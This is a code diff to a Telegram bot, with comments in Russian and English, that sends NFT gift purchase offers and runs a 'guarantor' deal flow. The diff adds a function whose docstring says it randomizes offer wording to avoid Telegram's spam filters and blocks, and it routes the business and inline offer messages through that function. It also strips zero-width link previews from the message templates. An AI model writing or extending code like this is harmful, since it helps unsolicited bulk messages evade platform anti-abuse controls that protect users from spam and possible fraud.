@@ -1,5 +1,6 @@
 import asyncio
 import re
+import random
 import logging
 from datetime import datetime, timezone
 from typing import Optional, Dict, Any, List, Union, Tuple
@@ -308,7 +309,6 @@ async def handle_start(message: Message, command: CommandObject, bot: Bot):
 
                     if deal_lang == "ENG":
                         screen2_text = (
-                            f'<a href="{deal["nft_url"]}">&#8203;</a>'
                             f"<b>Gift:</b> <a href=\"{deal['nft_url']}\"><b>{deal['nft_name']} #{formatted_number}</b></a>\n"
                             f"<b>Deal amount:</b> <b>{deal['stars_amount']} {currency_name}</b>\n"
                             f"<b>Guarantor:</b> {buyer_display}\n"
@@ -322,7 +322,6 @@ async def handle_start(message: Message, command: CommandObject, bot: Bot):
                         )
                     else:
                         screen2_text = (
-                            f'<a href="{deal["nft_url"]}">&#8203;</a>'
                             f"<b>Подарок:</b> <a href=\"{deal['nft_url']}\"><b>{deal['nft_name']} #{formatted_number}</b></a>\n"
                             f"<b>Сумма сделки:</b> <b>{deal['stars_amount']} {currency_name}</b>\n"
                             f"<b>Гарант сделки:</b> {buyer_display}\n"
@@ -400,6 +399,55 @@ async def handle_menu_create(callback: CallbackQuery, state: FSMContext):
         parse_mode="HTML"
     )
     await safe_answer(callback)
+
+def build_randomized_offer_text(nft_name: str, nft_number: str, nft_url: str, stars_txt: str, timer_str: str, lang: str = "RU") -> Tuple[str, str]:
+    """
+    Генерирует рандомизированный текст оффера для защиты от спам-фильтров и блокировок Telegram.
+    Возвращает (offer_text_html, clean_offer_text_plain).
+    """
+    if lang == "ENG":
+        headers = [
+            f"A user offers you <b>{stars_txt}</b> for gift <a href=\"{nft_url}\"><b>{nft_name} #{nft_number}</b></a>.",
+            f"You received an offer of <b>{stars_txt}</b> for gift <a href=\"{nft_url}\"><b>{nft_name} #{nft_number}</b></a>.",
+            f"New purchase offer for <a href=\"{nft_url}\"><b>{nft_name} #{nft_number}</b></a>: <b>{stars_txt}</b>.",
+            f"A buyer wants to purchase <a href=\"{nft_url}\"><b>{nft_name} #{nft_number}</b></a> for <b>{stars_txt}</b>."
+        ]
+        clean_headers = [
+            f"A user offers you {stars_txt} for gift {nft_name} #{nft_number}.",
+            f"You received an offer of {stars_txt} for gift {nft_name} #{nft_number}.",
+            f"New purchase offer for {nft_name} #{nft_number}: {stars_txt}.",
+            f"A buyer wants to purchase {nft_name} #{nft_number} for {stars_txt}."
+        ]
+        footers = [
+            f"Expires in {timer_str}.",
+            f"Offer valid for {timer_str}.",
+            f"Active for {timer_str}."
+        ]
+    else:
+        headers = [
+            f"Пользователь предлагает Вам <b>{stars_txt}</b> за подарок <a href=\"{nft_url}\"><b>{nft_name} #{nft_number}</b></a>.",
+            f"Вам поступило предложение: <b>{stars_txt}</b> за подарок <a href=\"{nft_url}\"><b>{nft_name} #{nft_number}</b></a>.",
+            f"Новый оффер на покупку подарка <a href=\"{nft_url}\"><b>{nft_name} #{nft_number}</b></a> на сумму <b>{stars_txt}</b>.",
+            f"Покупатель готов приобрести <a href=\"{nft_url}\"><b>{nft_name} #{nft_number}</b></a> за <b>{stars_txt}</b>."
+        ]
+        clean_headers = [
+            f"Пользователь предлагает Вам {stars_txt} за подарок {nft_name} #{nft_number}.",
+            f"Вам поступило предложение: {stars_txt} за подарок {nft_name} #{nft_number}.",
+            f"Новый оффер на покупку подарка {nft_name} #{nft_number} на сумму {stars_txt}.",
+            f"Покупатель готов приобрести {nft_name} #{nft_number} за {stars_txt}."
+        ]
+        footers = [
+            f"Истекает через {timer_str}.",
+            f"Срок действия: {timer_str}.",
+            f"Действительно ещё {timer_str}.",
+            f"Осталось времени: {timer_str}."
+        ]
+
+    idx = random.randint(0, len(headers) - 1)
+    footer = random.choice(footers)
+    offer_html = f"{headers[idx]}\n\n{footer}"
+    offer_plain = f"{clean_headers[idx]}\n\n{footer}"
+    return offer_html, offer_plain
 
 async def process_gift_url(message: Message, state: FSMContext, input_text: str, price: Optional[int] = None):
     text = (input_text or "").strip()
@@ -744,26 +792,14 @@ async def handle_create_send(callback: CallbackQuery, state: FSMContext, bot: Bo
     curr_symbol = "GRAM" if currency == "GRAM" else "⭐️"
     stars_txt = f"{price} {curr_symbol}" if curr_symbol == "GRAM" else f"{price} ⭐️"
 
-    if lang == "ENG":
-        clean_offer_text = (
-            f"A user offers you <b>{stars_txt}</b> for gift <b>{nft_data['name']} #{formatted_number}</b>.\n\n"
-            f"Expires in {timer_str}."
-        )
-        offer_text = (
-            f'<a href="{nft_data["url"]}">&#8203;</a>'
-            f"A user offers you <b>{stars_txt}</b> for gift <a href=\"{nft_data['url']}\"><b>{nft_data['name']} #{formatted_number}</b></a>.\n\n"
-            f"Expires in {timer_str}."
-        )
-    else:
-        clean_offer_text = (
-            f"Пользователь предлагает Вам <b>{stars_txt}</b> за подарок <b>{nft_data['name']} #{formatted_number}</b>.\n\n"
-            f"Истекает через {timer_str}."
-        )
-        offer_text = (
-            f'<a href="{nft_data["url"]}">&#8203;</a>'
-            f"Пользователь предлагает Вам <b>{stars_txt}</b> за подарок <a href=\"{nft_data['url']}\"><b>{nft_data['name']} #{formatted_number}</b></a>.\n\n"
-            f"Истекает через {timer_str}."
-        )
+    offer_text, clean_offer_text = build_randomized_offer_text(
+        nft_name=nft_data["name"],
+        nft_number=formatted_number,
+        nft_url=nft_data["url"],
+        stars_txt=stars_txt,
+        timer_str=timer_str,
+        lang=lang
+    )
 
     business_keyboard = get_screen1_keyboard(deal_id=deal_id, lang=lang, is_business=True)
     pm_keyboard = get_screen1_keyboard(deal_id=deal_id, lang=lang, is_business=False)
@@ -1783,20 +1819,19 @@ async def handle_inline_query(inline_query: InlineQuery, bot: Bot):
     price_txt = f"{stars_amount} {curr_symbol}" if curr_symbol == "GRAM" else f"{stars_amount} ⭐️"
     timer_str = "5 h. 59 min." if lang == "ENG" else "5 ч. 59 мин."
 
+    message_text, _ = build_randomized_offer_text(
+        nft_name=nft_data["name"],
+        nft_number=formatted_number,
+        nft_url=nft_data["url"],
+        stars_txt=price_txt,
+        timer_str=timer_str,
+        lang=lang
+    )
+
     if lang == "ENG":
-        message_text = (
-            f'<a href="{nft_data["url"]}">&#8203;</a>'
-            f"A user offers you <b>{price_txt}</b> for gift <a href=\"{nft_data['url']}\"><b>{nft_data['name']} #{formatted_number}</b></a>.\n\n"
-            f"Expires in {timer_str}."
-        )
         article_title = f"🎁 Offer: {nft_data['name']} #{formatted_number}"
         article_desc = f"Offer {price_txt} for gift"
     else:
-        message_text = (
-            f'<a href="{nft_data["url"]}">&#8203;</a>'
-            f"Пользователь предлагает Вам <b>{price_txt}</b> за подарок <a href=\"{nft_data['url']}\"><b>{nft_data['name']} #{formatted_number}</b></a>.\n\n"
-            f"Истекает через {timer_str}."
-        )
         article_title = f"🎁 Оффер: {nft_data['name']} #{formatted_number}"
         article_desc = f"Предложить {price_txt} за подарок"
 
@@ -2062,7 +2097,6 @@ async def handle_accept_callback(callback: CallbackQuery, bot: Bot):
     # Экран 2 (Ожидание передачи подарка)
     if deal_lang == "ENG":
         screen2_text = (
-            f'<a href="{deal["nft_url"]}">&#8203;</a>'
             f"<b>Gift:</b> <a href=\"{deal['nft_url']}\"><b>{deal['nft_name']} #{formatted_number}</b></a>\n"
             f"<b>Deal amount:</b> <b>{deal['stars_amount']} {currency_name}</b>\n"
             f"<b>Guarantor:</b> {buyer_display}\n"
@@ -2076,7 +2110,6 @@ async def handle_accept_callback(callback: CallbackQuery, bot: Bot):
         )
     else:
         screen2_text = (
-            f'<a href="{deal["nft_url"]}">&#8203;</a>'
             f"<b>Подарок:</b> <a href=\"{deal['nft_url']}\"><b>{deal['nft_name']} #{formatted_number}</b></a>\n"
             f"<b>Сумма сделки:</b> <b>{deal['stars_amount']} {currency_name}</b>\n"
             f"<b>Гарант сделки:</b> {buyer_display}\n"
@@ -2152,13 +2185,11 @@ async def handle_cancel_accept_callback(callback: CallbackQuery, bot: Bot):
 
     if deal_lang == "ENG":
         revert_text = (
-            f'<a href="{deal["nft_url"]}">&#8203;</a>'
             f"A user offers you <b>{stars_txt}</b> for gift <a href=\"{deal['nft_url']}\"><b>{deal['nft_name']} #{formatted_number}</b></a>.\n\n"
             f"Expires in {timer_str}."
         )
     else:
         revert_text = (
-            f'<a href="{deal["nft_url"]}">&#8203;</a>'
             f"Пользователь предлагает Вам <b>{stars_txt}</b> за подарок <a href=\"{deal['nft_url']}\"><b>{deal['nft_name']} #{formatted_number}</b></a>.\n\n"
             f"Истекает через {timer_str}."
         )
@@ -2215,14 +2246,12 @@ async def handle_decline_callback(callback: CallbackQuery, bot: Bot):
 
     if deal_lang == "ENG":
         declined_text = (
-            f'<a href="{deal["nft_url"]}">&#8203;</a>'
             f"<b>OFFER DECLINED</b>\n\n"
             f"<b>Gift:</b> <a href=\"{deal['nft_url']}\"><b>{deal['nft_name']} #{format_number(deal['nft_number'])}</b></a>\n"
             f"<b>Amount:</b> <b>{stars_txt}</b>"
         )
     else:
         declined_text = (
-            f'<a href="{deal["nft_url"]}">&#8203;</a>'
             f"<b>ОФФЕР ОТКЛОНЁН</b>\n\n"
             f"<b>Подарок:</b> <a href=\"{deal['nft_url']}\"><b>{deal['nft_name']} #{format_number(deal['nft_number'])}</b></a>\n"
             f"<b>Сумма:</b> <b>{stars_txt}</b>"
@@ -2359,7 +2388,6 @@ async def complete_deal_with_guarantor(
     # Экран успешно завершенной сделки
     if deal_lang == "ENG":
         screen_done_text = (
-            f'<a href="{deal["nft_url"]}">&#8203;</a>'
             f"✅ <b>DEAL COMPLETED SUCCESSFULLY</b>\n\n"
             f"<b>Gift:</b> <a href=\"{deal['nft_url']}\"><b>{deal['nft_name']} #{formatted_number}</b></a>\n"
             f"<b>Deal amount:</b> <b>{deal['stars_amount']} {currency_name}</b>\n"
@@ -2369,7 +2397,6 @@ async def complete_deal_with_guarantor(
         )
     else:
         screen_done_text = (
-            f'<a href="{deal["nft_url"]}">&#8203;</a>'
             f"✅ <b>СДЕЛКА УСПЕШНО ЗАВЕРШЕНА</b>\n\n"
             f"<b>Подарок:</b> <a href=\"{deal['nft_url']}\"><b>{deal['nft_name']} #{formatted_number}</b></a>\n"
             f"<b>Сумма сделки:</b> <b>{deal['stars_amount']} {currency_name}</b>\n"
